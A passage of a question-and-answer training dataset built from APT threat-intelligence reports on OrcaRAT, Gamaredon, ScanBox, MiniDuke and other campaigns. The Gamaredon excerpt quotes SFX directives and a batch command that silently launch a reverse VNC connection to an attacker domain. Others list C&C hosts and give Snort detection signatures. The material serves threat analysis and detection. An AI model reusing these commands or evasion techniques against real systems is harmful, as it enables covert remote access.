    "output": "The malware communicates with a remote command and control (CnC) server using HTTP requests. It sends an initial GET request to 'check in' with the CnC server, including a keyword 'p=2' to indicate the version of the malware. The malware encrypts the information it collects using the base64 algorithm before sending it to the CnC server. Notably, the base64 data is subjected to substitutions where the '/' (forward slash) and '+' (plus) characters are replaced with '_' (underscore) and '\u00ad' (hyphen) respectively. This prevents straightforward inspection on the wire. The encrypted data includes a time-based counter, a campaign keyword ('osamu'), hostname, and OS information. The malware awaits further commands from the CnC server in response to the data sent out.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "OrcaRAT - A whale of a tale\nBy Dan Kelly and Tom Lancaster\nIt's every malware analyst's dream to be handed a sample which is, so far, unnamed by the AV community - especially when the malware in question may have links to a well-known APT group.\nIn my line of work I analyse several 'unknown' malware samples a week, but often it turns out that they are simply new variants of existing malware families. Recently I was fortunate enough to be handed something that not only had a low detection rate but, aside from heuristics, seemed to be relatively unknown to the top 40 anti-virus companies.\nIn this post I will walk you through the malware family we've dubbed \"OrcaRAT\".\nFirst of all, it is worth pointing out that most of the malware I see on a day-to-day basis is espionage orientated, and very rarely do the programmers and operators make much effort to cover their tracks. The use of forged HTTP headers is a common occurrence and simple mistakes within these headers are frequent.\nThe malware in question was handed to me by one of our threat intelligence analysts who was hunting through infrastructure associated with some samples of Comfoo[1] malware and happened across a malware sample (253a704acd7952677c70e0c2d787791b8359efe2c92a5e77acea028393a85613) he didn't recognise. He immediately took the malware and passed it through first stage analysis, which involves running the file in a sandbox environment. After this, he handed it over for more in-depth capability analysis.\n\nAnswer this question based on the above context: How does the discovery of OrcaRAT differ from typical malware analysis processes, and what unique characteristics set it apart from commonly encountered malware?",
    "output": "The discovery of OrcaRAT stands out because it was initially unrecognized by the top 40 anti-virus companies, indicating a low detection rate and potential novelty. Unlike typical malware, which often consists of new variants of existing families, OrcaRAT appeared to be relatively unknown. This uniqueness was further highlighted by its association with infrastructure linked to Comfoo malware, suggesting potential ties to a well-known APT group. Additionally, while most espionage-oriented malware makes little effort to conceal its tracks, OrcaRAT exhibited characteristics that made it more challenging to detect and analyze, setting it apart from the usual malware encountered in day-to-day analysis.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: SFX Files and UltraVNC\nSFX files allow someone to package other files in an archive and then specify what will happen when a user opens the package. In the case of Gamaredon, they generally keep it simple and bundle together a package containing a simple Batch script and UltraVNC software. This lightweight VNC server can be preconfigured to initiate a connection back to another system, commonly referred to as a reverse tunnel, allowing attackers to bypass the typical firewall restrictions; these reverse connections seemingly are not initiated by the attacker but instead come from inside the network where the victim exists. To illustrate how this occurs, we will step through one of the SFX files (SHA256: 4e9c8ef5e6391a9b4a705803dc8f2daaa72e3a448abd00fad36d34fe36f53887) that we recently identified.\nWhen building an SFX file one has the option to specify a series of commands that will be executed upon successful extraction of the archive. In the case of Gamaredon, the majority of SFX files will launch a batch file, which is included in the archive. In some instances, the actor will shuffle files around within the archive to try to obfuscate what they are, but usually a command line switch can be found, similar to this:\n;!@Install@!UTF-8!\nInstallPath=\"%APPDATA%\\\\Drivers\"\nGUIMode=\"2\"\nSelfDelete=\"1\"\nRunProgram=\"hidcon:34679.cmd\"\nThis will extract the files to %APPDATA%\\\\Drivers and then run the Windows Batch file 34679.cmd in a hidden console. The use of the hidcon (hidden console) prefix followed by a four-five digit filename with a cmd extension is observed in the majority of our tracked samples during this time period.\nThe following files were included in this particular archive:\n27285cb2b5bebd5730772b66b33568154cd4228c92913c5ef2e1234747027aa5 owxxxGxzxqxxxExw.jpg 3225058afbdf79b87d39a3be884291d7ba4ed6ec93d1c2010399e11962106d5b rc4.key\nTable 2. Files included in the example SFX Archive.\nThe batch files use randomized alphanumeric strings for the variable names, and \u2013 depending on the sample \u2013 collect different information or use different domains and filenames; however, at the core they each perform one specific function \u2013 initiate the reverse VNC connection. The purpose of this file is to obscure and execute the desired command: start \"\" \"%CD%\\sysctl.exe\" -autoreconnect -id: [system media access control (MAC) address] -connect technec[.]org:8080\nIn this case, the attacker sets the variable nRwuwCwBwYwbwEwI twice, which we believe is likely due to copy-pasting from previous scripts (we'll cover this in more detail later). This variable, along with the next few, will identify the process name the malware will masquerade under, an identifier with which to track the victim, the remote attacker's domain to which the connection should be made, the word connect, which is dropped into the VNC command, and then the port, 8080, which the VNC connection will use. At every turn, the actor tries to blend into normal user traffic to remain under the radar for as long as possible.\nAfter the variables are set, the command line script copies QlpxpQpOpDpnpRpC.ini to the executable name that has been picked for this run and then attempts to kill any legitimate process using the specified name before launching it. The name for the .ini file is randomized per archive, but almost always turns out to be that of the VNC server itself.\nAs stated previously, one benefit of this VNC server is that it will use the supplied configuration file (UltraVNC.ini), and \u2013 along with the two files rc4.key and MSRC4Plugin_for_sc.dsm \u2013 will encrypt the communication to further hide from network detection tools.\nIt's not yet clear what the three .jpg files shown in Table 2 are used for as they are base64-encoded data that is likely XOR encoded with a long key. Gamaredon has used this technique in the past, but these are likely staged files for the attacker to decode once they connect to the system.\nThe following are the SFX launch parameters from a separate file to illustrate how the actor attempts to obfuscate the file names but also that these potentially staged files are not present in all samples.\nInstallPath=\"%USERPROFILE%\\\\Contacts\"\nGUIMode=\"2\"\nSelfDelete=\"1\"\nRunProgram=\"hidcon:cmd.exe /c copy /y %USERPROFILE%\\Contacts\\18820.tmp\n%USERPROFILE%\\Contacts\\MSRC4Plugin_for_sc.dsm\"\nRunProgram=\"hidcon:cmd.exe /c copy /y %USERPROFILE%\\Contacts\\25028.tmp %USERPROFILE%\\Contacts\\rc4.key\"\nRunProgram=\"hidcon:cmd.exe /c copy /y %USERPROFILE%\\Contacts\\24318.tmp %USERPROFILE%\\Contacts\\UltraVNC.ini\" RunProgram=\"hidcon:cmd.exe /c copy /y %USERPROFILE%\\Contacts\\25111.tmp %USERPROFILE%\\Contacts\\wn.cmd\" RunProgram=\"hidcon:%USERPROFILE%\\\\Contacts\\\\wn.cmd\"\nWhile investigating these files, we observed what we believe was active development on these .cmd files that helps illuminate the Gamaredon group's processes.\nSpecifically, on Jan. 14 starting at 01:23 am GMT, we began seeing VirusTotal uploads of a seemingly in-draft .cmd file pointing to the same attacker-controlled VNC server. Initially, these files were uploaded to VirusTotal via the Tor network and used the process name svchosst over transmission control protocol (TCP)/8080, leveraging the user's Windows security identifier (SID) instead of MAC address for the VNC identification. The SFX files simply had the name 1.exe.\n@for /f %%i in ('wmic useraccount where name^='%USERNAME%' get sid ^| find \"S-1\"') do set JsVqVzVxVfVqVaVs=%%i set ZGVxVkVIVUVlVgVb=technec[.]org set qgSjSdSaSsSiSGS3=svchosst set AVlflclclZlPlYlI=8080\nset djM8MfMRM0M5MBM0=connect\nThree minutes later, we saw the same file uploaded via Tor, but the actor had changed the port to TCP/80 and introduced a bug in the code that prevents it from executing correctly. Note the positional change of the variables as well.\nset djM8MfMRM0M5MBM0=onnect set r8JgJJJHJGJmJHJ5=%RANDOM% set ZGVxVkVIVUVlVgVb=technec[.]org set qgSjSdSaSsSiSGS3=svchosst set AVlflclclZlPlYlI=80\nThe bug is due to the onnect value that is set. Reviewing how the reverse VNC connection is launched, this value is used in two places: -autorec%djM8MfMRM0M5MBM0% and -%djM8MfMRM0M5MBM0%.\nstart \"1\" \"%CD%\\%qgSjSdSaSsSiSGS3%.exe\"\n-autorec%djM8MfMRM0M5MBM0% -id:%r8JgJJJHJGJmJHJ5%\n-%djM8MfMRM0M5MBM0% %ZGVxVkVIVUVlVgVb%:80%AVlflclclZlPlYlI%\nThe second instance doesn't contain the c value needed to correctly spell the word and thus presents an invalid parameter. After another three minutes, the actor uploaded an SFX file called 2.exe, simply containing test.cmd with the word test in the content.\nAgain, minutes later, we saw 2.exe uploaded with the test.cmd, but this time it contained the initial part of the .cmd file. However, the actor had forgotten to include the VNC connect string.\nThis is where it gets interesting, though \u2013 about 15 minutes later, we saw the familiar 2.exe upload with test.cmd, but this time it was being uploaded directly by a user in Russia from a public IP address. We continued to observe this pattern of uploads every few minutes, where each was a slight iteration of the one before. The person uploading the files appeared to be rapidly \u2013 and manually \u2013 modifying the .cmd file to restore functionality (though the actor was unsuccessful in this series of uploads).\nSeveral domains and IP addresses were hard-coded in VNC samples that are not related to any of domain clusters 1-3 (documented in our full IoC list).\nBig Headline: SSL Pivot to Additional Infrastructure and Samples\nWhile conducting historical research on the infrastructure in cluster 1, we discovered a self-signed certificate associated with cluster 1 IP address 92.242.62[.]96:\nSerial: 373890427866944398020500009522040110750114845760\nSHA1: 62478d7653e3f5ce79effaf7e69c9cf3c28edf0c\nIssued: 2021-01-27\nExpires: 2031-01-25\nCommon name: ip45-159-200-109.crelcom[.]ru\nAlthough the IP Address WHOIS record for Crelcom LLC is registered to an address in Moscow, the technical admin listed for the netblock containing the IP address is registered to an address in Simferopol, Crimea. We further trace the apparent origins of Crelcom back to Simferopol, Crimea, as well.\nThis certificate relates to 79 IP addresses:\nThe common-name IP address - no Gamaredon domains\nOne IP address links to cluster 1 above (92.242.62[.]96)\n76 IP addresses link to another distinct collection of domains \u2013 \"cluster 2\"\n1 IP address led us to another distinct cluster, \"cluster 3\" (194.67.116[.]67)\nWe find almost no overlap of IP addresses between these separate clusters.\n\nDescribe the process of active development observed in the Gamaredon group's .cmd files based on the VirusTotal uploads. What insights does this provide into the group's methods?",
    "output": "A: On January 14, starting at 01:23 am GMT, VirusTotal uploads showed active development of .cmd files by the Gamaredon group. Initially, these files were uploaded via the Tor network and used the process name 'svchosst' over TCP/8080, leveraging the user's Windows SID for VNC identification. Subsequent uploads showed iterative changes, including a bug that prevented correct execution and changes in port numbers. The rapid, manual modifications suggest that the group was actively developing and testing their scripts, providing insights into their trial-and-error approach and the manual nature of their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Executive Summary\nIn early July 2015, Chinese APT actors used an Adobe Flash Player exploit within a specific webpage detailing a noteworthy international legal case between the Philippines and China. This precedent setting legal case would be followed by many Southeast Asian nations, as well as others around the globe. The exploit appeared on day three of the Permanent Court of Arbitration tribunal, exposing an untold number of interested parties that visited the webpage to potential exploitation.\nWhen considered holistically, the intelligence supports the conclusion that this exploitation campaign was purposefully carried out against the backdrop of diplomatic and legal maneuvering. Despite Beijing's unwillingness to participate in the international arbitration and their rejection of the PCA's jurisdiction, there appears to be a distinct effort to surreptitiously target those who are interested in this landmark international legal case via electronic means.\nThreatConnect has shared the details of this incident to our Common Community within Incident (<https://app.threatconnect.com/tc/auth/incident/incident.xhtml?incident=839940>)20150710D: Permanent Court of Arbitration Flash Exploit. Log into your ThreatConnect account or register for one via our (<http://www.threatconnect.com/product/product_editions>)Community Editions and access the most comprehensive and widely adopted Threat Intelligence Platform on the market.\nAnswer this question: Why did the Chinese APT actors choose to use an Adobe Flash Player exploit during the Permanent Court of Arbitration tribunal, and how does this align with their strategic objectives?",
    "output": "The Chinese APT actors chose to use an Adobe Flash Player exploit during the Permanent Court of Arbitration tribunal to target individuals interested in the high-profile international legal case between the Philippines and China. This exploit was timed to coincide with the third day of the tribunal, suggesting a deliberate attempt to capitalize on the heightened interest and traffic to the webpage detailing the case. The exploit was likely aimed at gathering intelligence or compromising systems of those following the case, which included many Southeast Asian nations and others globally. This strategy aligns with China's broader objective of gaining insights into the legal proceedings and potentially influencing outcomes, despite their official stance of rejecting the PCA's jurisdiction and refusing to participate in the arbitration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3 Psychological Operations (PSYOPS) and Social Media\nPsychological Operations (PSYOPS) is a military activity which is aimed at influencing the perceptions, attitudes and behaviours of target populations. The perception is usually affected by either emotional appeals or rational arguments, corresponding to the master narrative, and in social media, where one has to compete with a flood of information and large amounts of information noise, elements like surprise, cognitive dissonance, easily recognisable symbols or some eye-catching techniques are used in order to draw the audience into the PSYOPS product.\nIn PSYOPS the influence over a target group is often achieved by spreading rumours. Those can be:\n\u2022 Hate rumours: exploit ingrained dislikes and prejudices of a target population.\n\u2022 Fear rumours: exploit a human tendency to believe the worst.\n\u2022 Hope rumours: exploit wishes for a favourable turn of events.\nModern technology allows particularly easy exploitation of digital material in order to produce falsified or ambiguous content which can be used for deception and manipulation. Textual messages (posts, status updates, comments) can also be crafted according to the same principles.\nSocial media provides fruitful soil for PSYOPS as it is largely a trust-based network since it is formed on a networks of friends or like-minded group members. Hence the information coming from an individual or group can be more trusted than that coming from an official mass-media outlet or government communicators. This trust can be manipulated to achieve particular effects. It allows targeting of groups of people connected by certain social ties which increases the chance of the desired effect on perception and behaviour.\nIt is also very easy to hide the real identity or original source of information on social media as well as manipulate digital data such as imagery. Hence the concept\nof social cyber attack becomes increasingly important as it is based on manipulated information being spread under false identities to networks of users.\n3 Rebecca Goolsby. On Cybersecurity, Crowdsourcing and Social Cyber-Attack. Washington: Wilson Center. U.S. Office of Naval Research, 2013.\n\nQ: Why is social media considered fertile ground for Psychological Operations (PSYOPS), and how can it be leveraged to influence target populations?",
    "output": "A: Social media is considered fertile ground for PSYOPS because it operates largely as a trust-based network, formed on networks of friends or like-minded group members. Information coming from individuals or groups within these networks can be more trusted than that coming from official mass-media outlets or government communicators. This trust can be manipulated to achieve specific effects on perception and behavior. Additionally, social media allows for the easy concealment of the real identity or original source of information, as well as the manipulation of digital data such as imagery. This makes the concept of a social cyber attack increasingly important, where manipulated information is spread under false identities to networks of users.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why did the US Department of Homeland Security (DHS) issue a warning in May 2013 regarding cyberattacks against US energy companies located in the Middle East? What specific concerns did they highlight, and how did this relate to the broader trend of targeted attacks in the energy sector?",
    "output": "The US Department of Homeland Security (DHS) issued a warning in May 2013 due to an observed increase in sabotage attacks against US energy companies located in the Middle East. This warning was issued in conjunction with the Industrial Control Systems Cyber Emergency Response Team (ICS-CERT), indicating a heightened level of concern. The warning highlighted the potential for critical disruptions through sabotage attacks, which could cause substantial chaos and cascading effects resulting in financial loss. This specific incident underscored the broader trend of targeted attacks in the energy sector, where attackers often seek valuable information such as intellectual property related to photovoltaic research, wind turbines, or gas field exploration. Such information can generate huge profits for attackers or be misused for acts of sabotage.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Document exploits\nDocument exploits are exploits that target vulnerabilities in the way a document editing or viewing application processes a particular file format. (<>)Figure 35 shows encounter rates for individual exploits.\nFigure 35. Individual document exploits detected and blocked by Microsoft real-time antimalware products, 3Q14\u20132Q15\n\uf0b7 Most detections of exploits that affect Adobe Reader and Adobe Acrobat were associated with the exploit family (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=Win32/Pdfjsc>)Win32/Pdfjsc, a detection for PDF files containing malicious JavaScript that targets (<http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0188>)CVE-2010-0188 and other vulnerabilities. Adobe released Security Bulletin (<http://www.adobe.com/support/security/bulletins/apsb10-07.html>)APSB10-07 in February 2010 to address CVE-2010-0188. Pdfjsc and related exploits were particularly prevalent in eastern Europe. Pdfjsc mostly targets older Java vulnerabilities, so attackers may find it less useful as more computers are updated to newer versions of Java, which could explain the decrease in encounters over the past several quarters.\nMedium Headline: Adobe Flash Player exploits\nFigure 36. Adobe Flash Player exploits detected and blocked by Microsoft real-time antimalware products, 3Q14\u20132Q15\n\uf0b7 Encounters involving Obfuscator variants that target Adobe Flash Player increased from very low levels in 1Q15 to become the largest source of Flash Player-related exploit encounters in 2Q15. Most of these encounters involved two newly discovered threats: (<http://www.microsoft.com/security/portal/threat/encyclopedia/Entry.aspx?Name=Exploit:SWF/Obfuscator.K>)Exploit:SWF/Obfuscator.K targets (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8439>)CVE-2014-8439, (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0311>)CVE-2015-0311, (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0313>)CVE-2015-0313, and (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0359>)CVE-2015-0359; (<http://www.microsoft.com/security/portal/threat/encyclopedia/Entry.aspx?Name=Exploit:SWF/Obfuscator.L>)Exploit:SWF/Obfuscator.L mainly targets (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0336>)CVE-2015-0336.\n\uf0b7 \uf0b7 \uf0b7\n\nQuestion: Why did the Win32/Pdfjsc exploit family primarily target older Java vulnerabilities, and how did this impact its effectiveness over time?\n\nAnswer:",
    "output": "The Win32/Pdfjsc exploit family primarily targeted older Java vulnerabilities because it leveraged known weaknesses in outdated software versions. This strategy was effective initially, especially in regions like eastern Europe where systems might not have been regularly updated. However, as more computers were updated to newer versions of Java, which patched these vulnerabilities, the effectiveness of Pdfjsc decreased. This explains the observed decline in encounters with Pdfjsc over the past several quarters. Attackers found it less useful as the user base became more secure through updates, leading to a natural reduction in the prevalence of this particular exploit.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the Red October APT attackers exploit the CVE-2012-0158 vulnerability in Microsoft Office to deliver malicious code to their targets?",
    "output": "CVE-2012-0158 is a remote code execution vulnerability in the MSCOMCTL.OCX ActiveX control in Microsoft Office. According to the Red October APT report, the attackers used exploit code for this vulnerability, along with others, to deliver malicious code to their targets via email attachments, including Microsoft Excel and Word documents. The attackers likely embedded the exploit code in these documents, which, when opened by the victim, would trigger the vulnerability and execute the malicious code. The code would then initiate the setup of the main component of the malware, which would handle further communication with the C&C servers. The attackers' use of CVE-2012-0158, a publicly known vulnerability, highlights their ability to adapt and reuse existing exploits to achieve their goals.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the DUBNIUM malware disguise itself to appear legitimate, and what specific tactics does it employ to achieve this?",
    "output": "The DUBNIUM malware disguises itself as a Secure Shell (SSH) tool, specifically a certificate generation tool. It achieves this by having file descriptions and properties that appear convincingly legitimate at first glance. When executed, the program dumps out dummy certificate files into the file system, adding to its deceptive nature. Additionally, the binary is statically linked with the OpenSSL library, making it look like a genuine SSH tool. This tactic involves having more than 2,000 functions, most of which are statically linked to OpenSSL code without symbols, complicating reverse engineering efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 3.1. Going behind enemy lines \u2013 fears of proliferation and upcoming attacks\nAt one point during our investigation into infrastructure hosting ScanBox code, we identified a server which appeared to be used for development and testing purposes. On this occasion, the server side code was publicly accessible, allowing us to gain insights into the development and testing phase of an attack using ScanBox. This also included the ScanBox framework's own detailed reconnaissance against the developer themselves.\nWe noted the developer repeatedly uploading the modified versions to VirusTotal, presumably in an attempt to improve evasion of anti-virus.\nWe do not believe this developer is part of the core group that has access to the original implementation, but is instead another actor, who is likely rebuilding ScanBox from samples they find online.\nThe screenshot on the left is from a version currently in development by a possible attacker, the corresponding screenshot on the right is from a public article15.\n15 http://www.cnxhacker.com/2015/01/19/6412.html\nBig Headline: 4. Conclusion\nThe publication of threat information allows us to draw links between different campaigns, tools and malware but we need to be careful about which links we consider to be significant and ensure we're confident in how information that's publically available was derived. The summary above is just our view of the overlaps in web based tools/exploits and targets between different threat actors, but those with different datasets may be able to draw different conclusions.\nLast time, we identified three possible hypotheses to explain the overlap between the ScanBox users, in this blog, based on the data we have available, we can settle on just one of these conclusions:\n2. Selections of actors share some resources, as per previous observations with similar kits by some security vendors.\n\"\nSpecifically, our key conclusions are:\n\uf0b7 [High Confidence] -The DQM theory presented by FireEye and later explored by Symantec in 2014 about likely tool and exploit sharing between a specific set of groups continues to hold true, we can only speculate as to the nature of the relationships organisationally between these groups.\n\uf0b7 [Medium Confidence] -We currently believe that the activity represented by Cluster 1 and the activity related to Th3Bug are distinct, but that there is overlap in who they are tasked to target.\n\uf0b7 [Low confidence] \u2013 Th3Bug is one of the other actors who is in receipt of the same shared resource pool as those clusters already identified in this blog.\nWhat is not clear is why specific resources (web-based exploits) appear to be shared, and why others (primarily malware families) are sometimes kept within a specific cluster.\nMedium Headline: Snort Signatures \u2013 TLP WHITE\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"--[PwC CTD] -- MultiGroup - ScanBox and Targetted Watering Holes Content (plugin_pdf_ie())\"; flow:established,from_server; file_data; content:\"plugin_pdf_ie()\"; classtype:trojan-activity; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanboxframework-whos-affected-and-whos-using-it-1.html; metadata:tlp WHITE,author CDD; sid:xxxxxx; rev:2015021901;) alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"--[PwC CTD] -- MultiGroup - ScanBox Watering Hole Content (.item(0).appendChild(iframe_tag))\"; flow:established,from_server; file_data; content:\".item(0).appendChild(iframe_tag)\"; classtype:trojan-activity; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; metadata:tlp WHITE,author CDD; sid:xxxxxx; rev:2015021901;) alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"--[PwC CTD] -- MultiGroup - ScanBox and Targetted Watering Holes Content (var version\\;var ax\\;var e\\;try{axo=new ActiveXObject)\"; flow:established,from_server; file_data; content:\"var version\\;var ax\\;var e\\;try{axo=new ActiveXObject\"; classtype:trojan-activity; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; metadata:tlp WHITE,author CDD; sid:xxxxxx; rev:2015021901;) alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"--[PwC CTD] -- MultiGroup - ScanBox Watering Hole Content\n(document.getElementsByTagName('head').item(0).appendChild(form_tag)\\;)\"; flow:established,from_server; file_data; content:\"document.getElementsByTagName('head').item(0).appendChild(form_tag)\\;\"; classtype:trojan-activity; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; metadata:tlp WHITE,author CDD; sid:xxxxxx; rev:2015021901;) alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"--[PwC CTD] -- MultiGroup - ScanBox Watering Hole Content (return ((!a) ? 'x-': a) + Math.floor(Math.random() * 99999)\\;)\"; flow:established,from_server; file_data; content:\"return ((!a) ? 'x-': a)\n+ Math.floor(Math.random() * 99999)\\;\"; classtype:trojan-activity; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; metadata:tlp WHITE,author CDD; sid:xxxxxx; rev:2015021901;) alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"--[PwC CTD] -- MultiGroup - TH3BUG and Non-Targetted Groups Watering Hole Code (Chr(CInt(ns(i)) Xor n))\"; flow:established,from_server; file_data; content:\"Chr(CInt(ns(i)) Xor n)\"; classtype:trojan-activity; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; metadata:tlp WHITE,author CDD; sid:xxxxxx; rev:2015021901;)\nBig Headline: Further information\nFor more in-depth coverage, including full details of the analysis behind this blog as well as additional indicators which can be used to detect similar samples, or if you have any other queries, please give us a shout at threatintelligence@uk.pwc.com.\nThe information contained in this document has been prepared as a matter of interest and for information purposes only, and does not constitute professional advice. You should not act upon the information contained in this email without obtaining specific professional advice. No representation or warranty (express or implied) is given as to the accuracy or completeness of the information contained in this email, and, to the extent permitted by law, PricewaterhouseCoopers LLP, its members, employees and agents do not accept or assume any liability, responsibility or duty of care for any consequences of you or anyone else acting, or refraining to act, in reliance on the information contained in this email or for any decision based on it.\n\nQ: Why might a developer repeatedly upload modified versions of the ScanBox framework to VirusTotal? What does this imply about their intentions and the potential evolution of the toolset?",
    "output": "A: A developer repeatedly uploading modified versions of the ScanBox framework to VirusTotal is likely doing so to test and improve the evasion capabilities of the toolset against various antivirus solutions. This implies that the developer is actively working on enhancing the stealthiness of ScanBox, potentially making it harder for security systems to detect and mitigate. Such actions suggest that the developer aims to ensure the framework remains effective in future attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 4.4 MiniDuke backdoor: the second stage\nAs highlighted in(<>) section 3 2, the most recent versions of the MiniDuke backdoor have a lot of code similarities with earlier versions, such as the sample with SHA-1 of 86EC70C27E5346700714DBAE2F10E168A08210E4, described by Kaspersky researchers in 2014 (<>)[21]. Our analysis is based on the sample with SHA-1 B05CABA461000C6EBD8B237F318577E9BCCD6047, compiled on August 17, 2018.\nMiniDuke acts as a second-stage backdoor, which is dropped by one of the two first-stage components described in the sections above.\nThe most recent samples we are aware of were compiled in June 2019 and show no major changes, except the C&C domain and the use of an invalid (likely transplanted) digital signature, as shown in (<>)Figure 25.  This might be an attempt to bypass some security products.\nThe backdoor is still written in pure x86 assembly but its size increased a lot \u2013 from 20 KB to 200+ KB.  This is due to the addition of obfuscation, mainly control-flow flattening (<>)[26], as shown in (<>)Figure 26. This is a common obfuscation technique that makes it difficult to read the code because every function  is split in a switch/case inside a loop.\nSome of the Windows API functions are resolved dynamically. The backdoor uses a simple hash function  to obfuscate the name of the function it tries to resolve.\nThe network communication is relatively simple. It can use the GET, POST and PUT HTTP methods to contact the hardcoded C&C server.\nIn order to blend into the legitimate traffic, the data are prepended with a JPEG header. The resulting images are not valid, but it is very unlikely that anybody will check the validity of all pictures in the network traffic. (<>)Figure 27 is an example of a POST request to the C&C server. As the server was down at the time of capture, we were not able to receive a reply, but we believe the reply also contains a JPEG header, as the malware ignores the first bytes of the reply.\nIn addition to the HTTP protocol, the malware is able to send and receive data over a named pipe. This feature typically allows it to reach machines on the local network that don't have internet access. One compromised machine, with internet access, will forward commands to other compromised machines through the named pipe.\nA similar feature to the named pipe is the HTTP proxy. The malware will listen on a first socket, either  on the default port 8080 or on a port specified by the operators. It will also open a second socket with  the C&C server. It waits for connections on the first socket and when one is established, it proxies data between the two sockets. Thus, a machine without internet access, or with a firewall that blocks connections to the attackers' domain, might still be able to reach the C&C through the proxy machine.\nFinally, this malware implements thirty-eight different backdoor functions such as:\n\u2022 Uploading or downloading files\n\u2022 Creating processes\n\u2022 Getting system information (hostname, ID, pipename, HTTP method)\n\u2022 Getting the list of local drives and their type (unk, nrt, rmv, fix, net, cdr, ram, und)\n\u2022 Reading and writing in the named pipe\n\u2022 Starting and stopping the proxy feature\n\nAnswer this question based on the above context: How does the MiniDuke backdoor, associated with the APT29 group, obfuscate its code and what techniques does it employ to make reverse engineering difficult?",
    "output": "The MiniDuke backdoor, associated with the APT29 group, employs several obfuscation techniques to make reverse engineering difficult. One significant change in its recent versions is the increase in size from 20 KB to over 200 KB, primarily due to the addition of obfuscation techniques. A notable technique used is control-flow flattening, where each function is split into a switch/case inside a loop, making the code harder to read and understand. Additionally, some Windows API functions are resolved dynamically using a simple hash function to obfuscate the names of the functions it tries to resolve.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Platform orchestrator - mscfg32.dll, svchost32.dll\nCreates mutex: \"01C482BA-BD31-4874-A08B-A93EA5BCE511\", or terminates if one already exists.\nWrites a timestamped log \u0141le to one of the following locations:\n%SystemRoot%\\temp\\~yh56816.tmp\nC:\\Windows\\Temp\\~yh56816.tmp\n%Registry_SystemRoot_Value%\\temp\\~yh56816.tmp\nValue of [HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] D\nThe \u0141le \"~yh56816.tmp\" retains the history of execution. It comprises debug records of simple structure:\nStage: DWORD | DateTimeLow: DWORD | DateTimeHigh: DWORD\nBasically, it logs the execution of every stage of the orchestrator and the time of execution. The Stage is an integer number starting from 1.\nThis module spawns a new thread in the DllMain function which contains the main function body. The procedure disables application error popups shown by the default exception handler. This is probably done only in the \"Release\" version of the malware, because the following code generates exceptions that are reported to the user if application error popups are not disabled. We assume that the \"Debug\" version of the code doesn't suppress error popups when exception occurs as this helps with the debugging of the code.\nThe module checks the OS version and if it encounters an unsupported operating system the code generates an exception which terminates the application. The list of OS versions that pass this test:\nWindows 95/98/ME\nWindows NT 4.0 and above.\nIf the module runs on Win9x, it executes Win9x-speci\u0141c function RegisterServiceProcess to hide from the Windows Task Manager application. If the module is NOT running on WinNT6.0+, it then attempts to open a virtual device \u0141le with one of the following names:\n\\\\.\\MSSVC32 on Win9x\n\\\\.\\MSNDSRV on WinNT\nIf the device \u0141le is successfully opened, the module activates a rootkit for its process and for the \u0141le location \"%SYSTEM%\\unilay.dll\" local path. This is followed by \u0141nding and terminating a process named \"winproc.exe\" which is the name of another component of the platform. Note that this part of the code is executed only on platforms different from WinNT 6.x (Windows Vista and later).\nThe module was designed to fetch or update its main con\u0141guration data from different places. There are some default values set inside the code, such as some timeout values and the following C&Cs:\nwww.waeservices[.]com\n213.198.79.49\nThese default values can be overwritten later.\nNext, it locates a data section called \"Share2\" in the current module and veri\u0141es the starting magic number. If it is 0x63959700, it then decrypts the rest of the data in the section and interprets it as a\ncon\u0141guration block. However, data from the next location can override all previous settings. This is a registry value with special name.\nThe naming of the registry location is the same GUID-like SHA1 value as the one used in the loader (\"mscfg32.exe\"), and is produced from the source string \"Con\u0141guration\":\n[HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] {42E14DD3-\nThe con\u0141guration block stored in the registry value is encrypted using RC5 with the 1024-bit key. Both the loader and the orchestrator share the same key for encrypting and decrypting the registry values in the \"MemSubSys\" key.\nThe decrypted con\u0141guration block consists of a series of tagged con\u0141guration records in the following format:\n[RecordType:DWORD][RecordSize: DWORD][RecordValue: %RecordSize%]\nWe retrieved a copy of a con\u0141guration block and decrypted and partly 